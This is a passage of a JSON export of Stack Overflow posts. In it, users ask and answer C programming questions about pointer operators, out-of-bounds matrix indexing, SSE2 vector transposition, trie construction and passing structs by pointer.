(i.e., \"removes a <code>*</code>\" from the type of the expression). Therefore:</p>\n\n<pre><code>int *p = \u2026;\np; // int *\n*p; // int\n&amp;*p; // int *\n&amp;p; // int **\n*&amp;p; // int *\n</code></pre>\n\n<p>So, yes, in this context the result is the same: a pointer to <code>int</code>, because the <code>&amp;</code> and the <code>*</code> cancel out. However, this is also why the combinations are pointless: the result is the same as <code>p</code> by itself.</p>\n"}, {"tags": [], "owner": {"reputation": 11619, "user_id": 5346306, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/BsACH.jpg?s=128&g=1", "display_name": "Achal", "link": "https://stackoverflow.com/users/5346306/achal"}, "is_accepted": false, "score": 2, "last_activity_date": 1545851289, "last_edit_date": 1545851289, "creation_date": 1545850965, "answer_id": 53936058, "question_id": 53935936, "link": "https://stackoverflow.com/questions/53935936/difference-between-p-vs-p/53936058#53936058", "title": "Difference between `*&amp;p` vs `&amp;*p`?", "body": "<p>Considering below example</p>\n\n<pre><code>int a=10;\nint *p=&amp;a;\n</code></pre>\n\n<p>this</p>\n\n<pre><code>*&amp;p\n</code></pre>\n\n<p>means here both <code>*</code> and <code>&amp;</code> gets nullified and it result in <code>p</code> which is nothing but <code>&amp;a</code>.</p>\n\n<p>And this</p>\n\n<pre><code>&amp;*p\n</code></pre>\n\n<p>means first dereference <code>p</code> which gives <code>a</code> and then reference <code>&amp;</code> i.e address of <code>a</code> which is nothing but <code>p</code>, same as the first case.</p>\n"}, {"comments": [{"owner": {"reputation": 15724, "user_id": 5754656, "user_type": "registered", "accept_rate": 78, "profile_image": "https://i.stack.imgur.com/7jfX3.png?s=128&g=1", "display_name": "Artyer", "link": "https://stackoverflow.com/users/5754656/artyer"}, "edited": false, "score": 2, "creation_date": 1545854130, "post_id": 53936108, "comment_id": 94713131, "body": "Not the clockwise spiral rule; that&#39;s for types. These are just 2 unary operators that have the same <a href=\"https://en.cppreference.com/w/c/language/operator_precedence\" rel=\"nofollow noreferrer\">precedence</a>, and are evaluated right-to-left. (<code>&amp;*p</code> -&gt; <code>(&amp;(*(p)))</code>)"}], "tags": [], "owner": {"reputation": 9367, "user_id": 4454124, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c094d8979fb41b789a7c7f21d9329359?s=128&d=identicon&r=PG&f=1", "display_name": "mnistic", "link": "https://stackoverflow.com/users/4454124/mnistic"}, "is_accepted": false, "score": 0, "last_activity_date": 1545851224, "creation_date": 1545851224, "answer_id": 53936108, "question_id": 53935936, "link": "https://stackoverflow.com/questions/53935936/difference-between-p-vs-p/53936108#53936108", "title": "Difference between `*&amp;p` vs `&amp;*p`?", "body": "<p>By the <a href=\"http://c-faq.com/decl/spiral.anderson.html\" rel=\"nofollow noreferrer\">clockwise / spiral rule</a>:</p>\n\n<p>For <code>*&amp;p</code>:</p>\n\n<pre><code>             +-----+\n             | +-+ |\n             | ^ | |\n           * &amp; p ; |\n           ^ ^   | |\n           | +---+ |\n           +-------+\n</code></pre>\n\n<ul>\n<li>We first take the address of <code>p</code>, which is at this point the address of the address of <code>a</code>. </li>\n<li>Then we dereference that, which gives the address of <code>a</code>.</li>\n</ul>\n\n<p>For <code>&amp;*p</code>:</p>\n\n<pre><code>             +-----+\n             | +-+ |\n             | ^ | |\n           &amp; * p ; |\n           ^ ^   | |\n           | +---+ |\n           +-------+\n</code></pre>\n\n<ul>\n<li>We first dereference <code>p</code>, which gives us <code>a</code>. </li>\n<li>We then take the address of that, which gives us the address of <code>a</code>, just like before.</li>\n</ul>\n"}, {"tags": [], "owner": {"reputation": 8002, "user_id": 1143850, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2927fac544c9960cd5433688fe4cae1d?s=128&d=identicon&r=PG", "display_name": "Serge", "link": "https://stackoverflow.com/users/1143850/serge"}, "is_accepted": false, "score": 0, "last_activity_date": 1545862828, "last_edit_date": 1545862828, "creation_date": 1545859255, "answer_id": 53937293, "question_id": 53935936, "link": "https://stackoverflow.com/questions/53935936/difference-between-p-vs-p/53937293#53937293", "title": "Difference between `*&amp;p` vs `&amp;*p`?", "body": "<p><code>*&amp;p</code> == <code>*(&amp;p)</code>. <code>&amp;p</code> is an pointer to the pointer or int. <code>*(&amp;p)</code> is a value to which pointer of pointer points, which is value of <code>p</code>. To continue, <code>**&amp;p</code> will print '10'.</p>\n\n<p><code>&amp;*p</code> == <code>&amp;(*p)</code> where <code>*p</code> is the value at which the pointer points (value of <code>a</code>). Now <code>&amp;</code> is an address of <code>a</code>, which is <code>p</code> again. And to go further, <code>*&amp;*p</code> will print value of <code>a</code> (10).</p>\n"}], "owner": {"reputation": 743, "user_id": 246206, "user_type": "registered", "accept_rate": 70, "profile_image": "https://www.gravatar.com/avatar/a2d4d601c3e3caab1e9a8090ea63c47a?s=128&d=identicon&r=PG", "display_name": "gbox", "link": "https://stackoverflow.com/users/246206/gbox"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 683, "favorite_count": 0, "answer_count": 5, "score": 0, "last_activity_date": 1545862828, "creation_date": 1545850273, "question_id": 53935936, "link": "https://stackoverflow.com/questions/53935936/difference-between-p-vs-p", "title": "Difference between `*&amp;p` vs `&amp;*p`?", "body": "<pre><code>int a=10;\nint *p=&amp;a;\n</code></pre>\n\n<p>now looking at <code>&amp;*p</code> we first look at <code>*p</code> which is <code>10</code> and then at <code>&amp;10</code>\nwhich is the address of <code>10</code> or the address of <code>a</code></p>\n\n<p>In the case of <code>*&amp;p</code> we first look at the address of <code>p</code> and then at the value in this address which is <code>10</code></p>\n\n<p>But I understand that both <code>*&amp;p</code> vs <code>&amp;*p</code> are the same, why?</p>\n"}, {"tags": ["c", "file-handling", "file-read"], "comments": [{"owner": {"reputation": 11619, "user_id": 5346306, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/BsACH.jpg?s=128&g=1", "display_name": "Achal", "link": "https://stackoverflow.com/users/5346306/achal"}, "edited": false, "score": 1, "creation_date": 1545849518, "post_id": 53935788, "comment_id": 94711748, "body": "while printing inside <code>for</code> loop at the end of code, this <code>mat[i][j]</code> --&gt; <code>mat[k][l]</code>. Also <code>k&lt;=182</code> --&gt; <code>k &lt; 182</code> and <code>l&lt;=274</code> --&gt; <code>l &lt; 274</code> as <code>&lt;=</code> tends to access out of bound array elements, causes undefined behaviour."}, {"owner": {"reputation": 39, "user_id": 10737799, "user_type": "registered", "profile_image": "https://graph.facebook.com/10211385412345633/picture?type=large", "display_name": "Arslan Majid", "link": "https://stackoverflow.com/users/10737799/arslan-majid"}, "reply_to_user": {"reputation": 11619, "user_id": 5346306, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/BsACH.jpg?s=128&g=1", "display_name": "Achal", "link": "https://stackoverflow.com/users/5346306/achal"}, "edited": false, "score": 0, "creation_date": 1545849731, "post_id": 53935788, "comment_id": 94711823, "body": "done that . Still program terminates unexpectedly. I guess it has some thing to do with mat[i][j]=j; line. This is source of the problem."}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 1, "creation_date": 1545849783, "post_id": 53935788, "comment_id": 94711842, "body": "The dimensions of array <code>int mat[182][274];</code> is strange, you are indexing as <code>mat[i][j]=j;</code> when <code>j=255-i;</code> So <code>j</code> can never be <code>&gt; 255</code> unless <code>i &lt; 0</code> in which case you have problems with the array indexing."}, {"owner": {"reputation": 39, "user_id": 10737799, "user_type": "registered", "profile_image": "https://graph.facebook.com/10211385412345633/picture?type=large", "display_name": "Arslan Majid", "link": "https://stackoverflow.com/users/10737799/arslan-majid"}, "edited": false, "score": 0, "creation_date": 1545850338, "post_id": 53935788, "comment_id": 94712011, "body": "may be j=255-i is just an operation. Lets say i have a value 40 in file number 1. 40 will be subtracted from 255 and the result will be stored in second file. Now i want this number to be stored at matrix location (0,0) and so on repeat this process till the end of the loop."}, {"owner": {"reputation": 20255, "user_id": 645128, "user_type": "registered", "accept_rate": 84, "profile_image": "https://i.stack.imgur.com/G0V8Q.jpg?s=128&g=1", "display_name": "ryyker", "link": "https://stackoverflow.com/users/645128/ryyker"}, "edited": false, "score": 1, "creation_date": 1545850385, "post_id": 53935788, "comment_id": 94712026, "body": "As an aside, you might take a look at <i><a href=\"https://stackoverflow.com/questions/5431941/why-is-while-feof-file-always-wrong\">why !feof(file) is always problematic</a></i>, and not recommended."}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "reply_to_user": {"reputation": 20255, "user_id": 645128, "user_type": "registered", "accept_rate": 84, "profile_image": "https://i.stack.imgur.com/G0V8Q.jpg?s=128&g=1", "display_name": "ryyker", "link": "https://stackoverflow.com/users/645128/ryyker"}, "edited": false, "score": 0, "creation_date": 1545851830, "post_id": 53935788, "comment_id": 94712489, "body": "@ryyker that&#39;s true, but in this case <code>feof</code> is used to check the validity of the previous read operation. Still not to be recommended, it makes for awkward code."}], "answers": [{"comments": [{"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1545852197, "post_id": 53935940, "comment_id": 94712608, "body": "Also worth noting that as an automatic array, <code>mat[][]</code> it is not initialised, so some strange values may be printed for array elements not explictily set."}, {"owner": {"reputation": 13760, "user_id": 10795151, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Eazk7.png?s=128&g=1", "display_name": "S.S. Anne", "link": "https://stackoverflow.com/users/10795151/s-s-anne"}, "reply_to_user": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1545852484, "post_id": 53935940, "comment_id": 94712687, "body": "@Weather Vane Thank you. Updated."}], "tags": [], "owner": {"reputation": 13760, "user_id": 10795151, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Eazk7.png?s=128&g=1", "display_name": "S.S. Anne", "link": "https://stackoverflow.com/users/10795151/s-s-anne"}, "is_accepted": false, "score": 4, "last_activity_date": 1545852458, "last_edit_date": 1545852458, "creation_date": 1545850284, "answer_id": 53935940, "question_id": 53935788, "link": "https://stackoverflow.com/questions/53935788/read-values-from-a-file-and-store-it-in-2d-matrix/53935940#53935940", "title": "Read Values from a file and store it in 2D matrix", "body": "<p>Arrays in C start at <code>0</code> and end at <code>(array_size - 1)</code>.</p>\n\n<p>As you're accessing memory just outside the array, you're most likely experiencing segmentation faults.</p>\n\n<p>To fix this issue, change these lines:</p>\n\n<pre><code> for (k=0;k&lt;182;k++)\n {\n\n  for(l=0;l&lt;274;l++)\n  {\n\n      printf(\"%d \", mat[k][l]);\n  }\n }\n</code></pre>\n\n<p>Notice that I changed the relational operators from <code>&lt;=</code> and <code>&gt;=</code> to <code>&lt;</code> and <code>&gt;</code>, respectively.</p>\n\n<p>Along with that, you may need to fully initialize your array. Odd values may be printed if the array is not initialized. (@Weather Vane).</p>\n\n<p>However, to best be sure if this is the case, we need <code>file.txt</code> and <code>file1.txt</code>.</p>\n"}], "owner": {"reputation": 39, "user_id": 10737799, "user_type": "registered", "profile_image": "https://graph.facebook.com/10211385412345633/picture?type=large", "display_name": "Arslan Majid", "link": "https://stackoverflow.com/users/10737799/arslan-majid"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 51, "favorite_count": 0, "answer_count": 1, "score": 1, "last_activity_date": 1545858656, "creation_date": 1545849276, "last_edit_date": 1545858656, "question_id": 53935788, "link": "https://stackoverflow.com/questions/53935788/read-values-from-a-file-and-store-it-in-2d-matrix", "title": "Read Values from a file and store it in 2D matrix", "body": "<p>I am trying to read values from a file and after some operation write to another file. Here facing a slight issue as I am also trying to save values in a 2D Array and displaying it. My file read and file write are showing correct results but my program throws an exception when it comes to display matrix part. </p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;ctype.h&gt;\n\n#ifndef NULL\n#define NULL   ((void *) 0)\n#endif\n\nint main(void)\n{\n    FILE *file  = NULL; //for file read\n    FILE *fptr  = NULL; //for file write\n\n    int mat[182][274];\n\n    // code to read and display number from file\n    // open file for reading\n    file = fopen(\"file.txt\", \"r\");\n    fptr = fopen(\"file1.txt\", \"w\");\n    int i = 0,j=0;\n\n    fscanf (file, \"%d\", &amp;i);    \n    while (!feof (file))\n    {\n        symbol = fgetc(file);\n\n        if (symbol == '\\n' || feof(file))\n        {\n            fprintf (fptr,\"\\n\");\n            printf(\"\\n\");\n        }\n        else{\n            j=255-i;\n\n            mat[i][j]=j;\n\n            fprintf (fptr,\"%d \", j);\n            fprintf (fptr,\" \");\n            printf (\"%d \", j);\n        }\n\n        fscanf (file, \"%d\", &amp;i);\n\n   }\n   fclose (file);\n   fclose (fptr);\n\n\n   //Facing issue in this part\n   int k;\n   int l;\n   for (k=0;k&lt;=182;k++)\n   {\n\n       for(l=0;l&lt;=274;l++)\n       {\n\n           printf(\"%d \", mat[k][l]);\n       }\n   }\n\n   return 0;\n}\n</code></pre>\n"}, {"tags": ["c", "sse"], "owner": {"reputation": 393, "user_id": 7087604, "user_type": "registered", "accept_rate": 82, "profile_image": "https://i.stack.imgur.com/VntzM.jpg?s=128&g=1", "display_name": "Aur&#233;lien Pierre", "link": "https://stackoverflow.com/users/7087604/aur%c3%a9lien-pierre"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 54, "favorite_count": 0, "answer_count": 0, "score": 1, "last_activity_date": 1545848241, "creation_date": 1545848241, "question_id": 53935602, "link": "https://stackoverflow.com/questions/53935602/transpose-sse2-vectors", "title": "Transpose SSE2 Vectors", "body": "<p>I try to convolve an image for wavelet decomposition using SSE2 and C. This image has 4 channels (Lab + alpha) stored contiguously in memory : [LabA][LabA][LabA]\u2026 The alpha channel is irrelevant for what I do here.</p>\n\n<p>Accessing a pixel is then straightforward by loading the content of a pointer incremented by 4 interatively:</p>\n\n<pre><code>static void eaw_decompose_sse2(float *const out, \n                               const float *const in, \n                               float *const detail, \n                               const int scale,\n                               const float sharpen, \n                               const size_t width, \n                               const size_t height)\n{\n/* Convolve rows */\n#ifdef _OPENMP\n#pragma omp parallel for collapse(2)\n#endif\n  for(size_t j = 0; j &lt; height; j++)\n  {\n    for(size_t i = 0; i &lt; width; i++)\n    {\n      const size_t inc = (j * width + i) * 4;\n      float *pdetail = detail + inc;\n      float *pcoarse = tmp + inc;\n\n      // pixel to be convolved\n      const __m128 pin0 = _mm_load_ps(in + inc);\n      const __m128 w_0 = _mm_set1_ps(filter[2]);\n\n      // neighbours\n      const __m128 pin1 = _mm_load_ps(in + ASAN_ROW(i, j, -2, mult, max_height_i, width));\n      const __m128 pin2 = _mm_load_ps(in + ASAN_ROW(i, j, -1, mult, max_height_i, width));\n      const __m128 pin3 = _mm_load_ps(in + ASAN_ROW(i, j, 1, mult, max_height_i, width));\n      const __m128 pin4 = _mm_load_ps(in + ASAN_ROW(i, j, 2, mult, max_height_i, width));\n\n      // neighbours contribution\n      const __m128 w_1 = _mm_set1_ps(filter[0]) * weight_sse2(pin0, pin1, sharpen);\n      const __m128 w_2 = _mm_set1_ps(filter[1]) * weight_sse2(pin0, pin2, sharpen);\n      const __m128 w_3 = _mm_set1_ps(filter[3]) * weight_sse2(pin0, pin2, sharpen);\n      const __m128 w_4 = _mm_set1_ps(filter[4]) * weight_sse2(pin0, pin3, sharpen);\n\n      // Filter computation\n      const __m128 wgt = w_1 + w_2 + w_3 + w_4 + w_0;\n      const __m128 sum = (w_1 * pin1 + w_2 * pin2 + w_3 * pin3 + w_4 * pin4 + w_0 * pin0) * _mm_rcp_ps(wgt);\n\n      // High frequency layer\n      _mm_stream_ps(pdetail, pin0 - sum);\n\n      // Low frequency layer\n      _mm_stream_ps(pcoarse, sum);\n    }\n  }\n}\n</code></pre>\n\n<p>The function <code>ASAN_ROW</code> slides the pointer along the rows ensuring we stay in the bounds, if not, it takes the nearest neighbour. <code>weight_sse2</code> is a gaussian weight that does complicated bit-shifts because L and a/b have different weightings.</p>\n\n<p>So, instead of operating on 4 Lab SSE vectors, with the last element lost, I feel it would be faster to operate on 3 SSE vecors, each vector being a Lab channel, of which each element is a neighbouring pixel. So that would become:</p>\n\n<pre><code>static void eaw_decompose_sse2(float *const out, \n                               const float *const in, \n                               float *const detail, \n                               const int scale,\n                               const float sharpen, \n                               const size_t width, \n                               const size_t height)\n{\n/* Convolve rows */\n#ifdef _OPENMP\n#pragma omp parallel for collapse(2)\n#endif\n  for(size_t j = 0; j &lt; height; j++)\n  {\n    for(size_t i = 0; i &lt; width; i++)\n    {\n      const size_t inc = (j * width + i) * 4;\n      float *pdetail = detail + inc;\n      float *pcoarse = tmp + inc;\n\n      // pixel to be convolved\n      const __m128 pin0 = _mm_load_ps(in + inc);\n      const __m128 w_0 = _mm_set1_ps(filter[2]);\n\n      // neighbours\n      const __m128 pin1 = _mm_load_ps(in + ASAN_ROW(i, j, -2, mult, max_height_i, width));\n      const __m128 pin2 = _mm_load_ps(in + ASAN_ROW(i, j, -1, mult, max_height_i, width));\n      const __m128 pin3 = _mm_load_ps(in + ASAN_ROW(i, j, 1, mult, max_height_i, width));\n      const __m128 pin4 = _mm_load_ps(in + ASAN_ROW(i, j, 2, mult, max_height_i, width));\n\n      // Lab extraction - pixel to be convolved\n      __m128 L_0 =  _mm_set1_ps( pin0[0] ); // ?\n      __m128 a_0 =  _mm_set1_ps( pin0[1] ); // ?\n      __m128 b_0 =  _mm_set1_ps( pin0[2] ); // ?\n\n      // Lab extraction - neighbours\n      __m128 L_f = _mm_set_ps ({ pin1[0], pin2[0], pin3[0], pin4[0] }); // ?\n      __m128 a_f = _mm_set_ps ({ pin1[1], pin2[1], pin3[1], pin4[1] }); // ?\n      __m128 b_f = _mm_set_ps ({ pin1[2], pin2[2], pin3[2], pin4[2] }); // ?\n\n      // neighbours contribution\n      const __m128 filter = _mm_load_ps(filter_coeff);\n      const __m128 w_L = filter * weight_sse(L_0, L_f, sharpen);\n      const __m128 w_c = filter * weight_sse(a_0 + b_0, a_f + b_f, sharpen);\n\n      // Filter computation\n      const __m128 wgt = _mm_set_ps( { sum_of_elts_sse(w_L), \n                                       sum_of_elts_sse(w_c), \n                                       sum_of_elts_sse(w_c), \n                                       0.0f } );\n      const __m128 w1 = _mm_set_ps ({ w_L[0], w_c[0], w_c[0], 0.0f }); // ?\n      const __m128 w2 = _mm_set_ps ({ w_L[1], w_c[1], w_c[1], 0.0f }); // ?\n      const __m128 w3 = _mm_set_ps ({ w_L[2], w_c[2], w_c[2], 0.0f }); // ?\n      const __m128 w4 = _mm_set_ps ({ w_L[3], w_c[3], w_c[3], 0.0f }); // ?\n      const __m128 sum = (w_1 * pin1 + w_2 * pin2 + w_3 * pin3 + w_4 * pin4 + w_0 * pin0) * _mm_rcp_ps(wgt);\n\n      // High frequency layer\n      _mm_stream_ps(pdetail, pin0 - sum);\n\n      // Low frequency layer\n      _mm_stream_ps(pcoarse, sum);\n    }\n  }\n}\n</code></pre>\n\n<p>What is the most cache-efficient way to switch from the channel-based vectors (pixels vectors <code>pin0</code> to <code>pin4</code>) to the neighbour-based vectors (<code>L_0</code>, <code>L_f</code>), and the other way around (<code>w_L</code> and <code>w_c</code> to <code>w_1</code>-<code>w_4</code>) ? Would the second version be faster ?</p>\n"}, {"tags": ["c", "trie"], "comments": [{"owner": {"reputation": 6882, "user_id": 3403834, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/xpA5S.jpg?s=128&g=1", "display_name": "user58697", "link": "https://stackoverflow.com/users/3403834/user58697"}, "edited": false, "score": 1, "creation_date": 1545851717, "post_id": 53935594, "comment_id": 94712455, "body": "<code>sptr-&gt;letter[i] = malloc(sizeof(trie));</code> is definitely a problem. The pointers in the allocated node are not initialized."}, {"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "reply_to_user": {"reputation": 36469, "user_id": 5353753, "user_type": "registered", "accept_rate": 56, "profile_image": "https://www.gravatar.com/avatar/8658d889ba478c305810bd346e21da33?s=128&d=identicon&r=PG&f=1", "display_name": "sagi", "link": "https://stackoverflow.com/users/5353753/sagi"}, "edited": false, "score": 0, "creation_date": 1545857542, "post_id": 53935594, "comment_id": 94714069, "body": "@sagi: multiplication is commutative; it makes no difference which order the two numbers are provided to <code>calloc()</code>."}, {"owner": {"reputation": 1, "user_id": 10824371, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-LJloqjd12cg/AAAAAAAAAAI/AAAAAAAAAAA/AKxrwcaTbc-yDmG2zOe20kFCk-C249yphQ/mo/photo.jpg?sz=128", "display_name": "Deon ", "link": "https://stackoverflow.com/users/10824371/deon"}, "reply_to_user": {"reputation": 6882, "user_id": 3403834, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/xpA5S.jpg?s=128&g=1", "display_name": "user58697", "link": "https://stackoverflow.com/users/3403834/user58697"}, "edited": false, "score": 0, "creation_date": 1545897697, "post_id": 53935594, "comment_id": 94722368, "body": "@user58697 - I&#39;m not running into any memory issues that I know of (other than leaking since I&#39;m not freeing it yet). The program runs fine but the values I expect t find in &quot;exist&quot; are not correct. My original comment should have read head-&gt;letter[1]-&gt;exist changes values. Does sptr = head move sptr back to the first node?"}, {"owner": {"reputation": 1, "user_id": 10824371, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-LJloqjd12cg/AAAAAAAAAAI/AAAAAAAAAAA/AKxrwcaTbc-yDmG2zOe20kFCk-C249yphQ/mo/photo.jpg?sz=128", "display_name": "Deon ", "link": "https://stackoverflow.com/users/10824371/deon"}, "edited": false, "score": 0, "creation_date": 1545898346, "post_id": 53935594, "comment_id": 94722536, "body": "Thanks for all the help. I checked using debugger and sptr = head does what it is supposed to. My problem lies somewhere else, and I&#39;m not providing enough info here."}], "answers": [{"tags": [], "owner": {"reputation": 1, "user_id": 10824371, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-LJloqjd12cg/AAAAAAAAAAI/AAAAAAAAAAA/AKxrwcaTbc-yDmG2zOe20kFCk-C249yphQ/mo/photo.jpg?sz=128", "display_name": "Deon ", "link": "https://stackoverflow.com/users/10824371/deon"}, "is_accepted": true, "score": 0, "last_activity_date": 1546026258, "creation_date": 1546026258, "answer_id": 53963588, "question_id": 53935594, "link": "https://stackoverflow.com/questions/53935594/how-do-i-reset-the-pointer-to-the-head-node-when-adding-to-nodes/53963588#53963588", "title": "How do I reset the pointer to the head node when adding to nodes?", "body": "<p>Found the problem. It was in line sptr->exist = false, it should've read sptr->letter[i]->exist = false. The pointer was moving fine but I was changing the value of where the current pointer was, not the newly created node.</p>\n"}], "owner": {"reputation": 1, "user_id": 10824371, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-LJloqjd12cg/AAAAAAAAAAI/AAAAAAAAAAA/AKxrwcaTbc-yDmG2zOe20kFCk-C249yphQ/mo/photo.jpg?sz=128", "display_name": "Deon ", "link": "https://stackoverflow.com/users/10824371/deon"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 59, "favorite_count": 0, "accepted_answer_id": 53963588, "answer_count": 1, "score": 0, "last_activity_date": 1546026258, "creation_date": 1545848204, "last_edit_date": 1545857392, "question_id": 53935594, "link": "https://stackoverflow.com/questions/53935594/how-do-i-reset-the-pointer-to-the-head-node-when-adding-to-nodes", "title": "How do I reset the pointer to the head node when adding to nodes?", "body": "<p>I need to start with the head node every cycle to add the new node in the right place. I think my current code makes the pointer for head and sptr equal so when I move one, the other one moves too. How do I move the pointer  sptr to the beginning?</p>\n\n<p>In debugger <code>head-&gt;letter[1]</code> turns true when I save an \"a\" as a word as it should, but later turns back to false as soon as <code>sptr = head;</code> runs. I think it has to do with the pointers.</p>\n\n<pre><code>typedef struct node\n{\n    bool exist;\n    struct node* letter[28];\n} trie;\n\ntrie *head = NULL;\nint words = 0;\n\n// Loads dictionary into memory, returning true if successful else false\nbool load(const char *dictionary)\n{\n    int i = 0;\n\n    FILE *infile = fopen(dictionary, \"r\");\n    if (infile == NULL)\n    {\n        printf(\"Could not open %s.\\n\", dictionary);\n        return 1;\n    }\n    // allocate memory\n    head = calloc(sizeof(trie), 1);\n    head-&gt;exist = false;\n    trie *sptr = head;\n    int cr;\n\n    // loop through file one character at a time\n    while ((cr = fgetc(infile)) != EOF)\n    {\n        // build a trie\n        // check if it's end of line\n        if (cr != 10)\n        {\n            i = tolower(cr) - 96;\n            // check for apostrophy\n            if (i &lt; 0)\n            {\n                i = 0;\n            }\n            // check if the position exists\n            if (sptr-&gt;letter[i] == NULL)\n            {\n                sptr-&gt;letter[i] = malloc(sizeof(trie));\n                sptr-&gt;exist = false; // not the end of the word\n            }\n            sptr = sptr-&gt;letter[i];\n        }\n        else // indicate the end of a word that exists\n        {\n            sptr-&gt;exist = true;\n            sptr = head;// I think the problem might be here, I'm trying to move the pointer to the beginning.\n            words++;\n        }\n    }\n\n    return true;\n}\n</code></pre>\n"}, {"tags": ["c", "struct", "strcpy"], "comments": [{"owner": {"reputation": 673100, "user_id": 335858, "user_type": "registered", "accept_rate": 81, "profile_image": "https://www.gravatar.com/avatar/4af3541c00d591e9a518b9c0b3b1190a?s=128&d=identicon&r=PG", "display_name": "Sergey Kalinichenko", "link": "https://stackoverflow.com/users/335858/sergey-kalinichenko"}, "edited": false, "score": 5, "creation_date": 1545847397, "post_id": 53935458, "comment_id": 94711035, "body": "Long story short: you are initializing a copy of <code>struct student</code>, the original does not get changed. Pass a pointer."}], "answers": [{"comments": [{"owner": {"reputation": 13, "user_id": 7481920, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3d830f37232fa68e2639d126237f6ead?s=128&d=identicon&r=PG&f=1", "display_name": "Stokes", "link": "https://stackoverflow.com/users/7481920/stokes"}, "edited": false, "score": 0, "creation_date": 1545847833, "post_id": 53935483, "comment_id": 94711166, "body": "Thanks a lot, it works now!There is one thing I still don&#39;t get:<code>struct student new_student</code> isn&#39;t a pointer, why can you use it as a pointer by passing its adres to feed_struct?"}], "tags": [], "owner": {"reputation": 158911, "user_id": 1687119, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f9c3036c1979d65847da3bdc271bb5b9?s=128&d=identicon&r=PG", "display_name": "dbush", "link": "https://stackoverflow.com/users/1687119/dbush"}, "is_accepted": true, "score": 2, "last_activity_date": 1545847409, "creation_date": 1545847409, "answer_id": 53935483, "question_id": 53935458, "link": "https://stackoverflow.com/questions/53935458/initialising-structs-via-function-with-strcpy-in-c/53935483#53935483", "title": "initialising structs via function with strcpy in c", "body": "<p>You're passing <code>new_student</code> to <code>feed_struct</code> directly by value.  So changes in the function are not visible in <code>main</code>.</p>\n\n<p>You need to pass a pointer to <code>struct student</code> to <code>feed_struct</code>.  Then you can dereference that pointer to change the pointed-to object.</p>\n\n<pre><code>// first parameter is a pointer\nvoid feed_struct(struct student *x, char name [20], char lname [20], double a, char adres [50], int b)\n{\n    strcpy(x-&gt;name, name);\n    strcpy(x-&gt;lastname, lname);\n    x-&gt;number = a;\n    strcpy(x-&gt;adres, adres);\n    x-&gt;course = b;\n\n\n}\n\nint main (void)\n{\n    struct student new_student;\n    // pass a pointer\n    feed_struct(&amp;new_student, \"Peter\", \"Panther\", 1230, \"El-Lobo-Street 32\", 72);\n    struct_print(new_student);\n    return 0;\n\n}  \n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 249903, "user_id": 2422776, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2353050223ebecb113741c29458de4b2?s=128&d=identicon&r=PG", "display_name": "Mureinik", "link": "https://stackoverflow.com/users/2422776/mureinik"}, "is_accepted": false, "score": 0, "last_activity_date": 1545847496, "creation_date": 1545847496, "answer_id": 53935500, "question_id": 53935458, "link": "https://stackoverflow.com/questions/53935458/initialising-structs-via-function-with-strcpy-in-c/53935500#53935500", "title": "initialising structs via function with strcpy in c", "body": "<p>You are passing the struct by value. The <code>strcpy</code> calls copy strings to a local copy of the struct, that's discarded at the end of the function. You should instead pass a pointer to it, so the same struct can be initialized:</p>\n\n<pre><code>void feed_struct(struct student* x, /* pointer to struct student */\n                 char name [20],\n                 char lname [20],\n                 double a,\n                 char adres [50],\n                 int b)\n{\n    strcpy(x-&gt;name, name);\n    strcpy(x-&gt;lastname, lname);\n    x-&gt;number = a;\n    strcpy(x-&gt;adres, adres);\n    x-&gt;course = b;\n}\n</code></pre>\n"}], "owner": {"reputation": 13, "user_id": 7481920, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3d830f37232fa68e2639d126237f6ead?s=128&d=identicon&r=PG&f=1", "display_name": "Stokes", "link": "https://stackoverflow.com/users/7481920/stokes"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 35, "favorite_count": 0, "closed_date": 1545847557, "accepted_answer_id": 53935483, "answer_count": 2, "score": 1, "last_activity_date": 1545847496, "creation_date": 1545847255, "question_id": 53935458, "link": 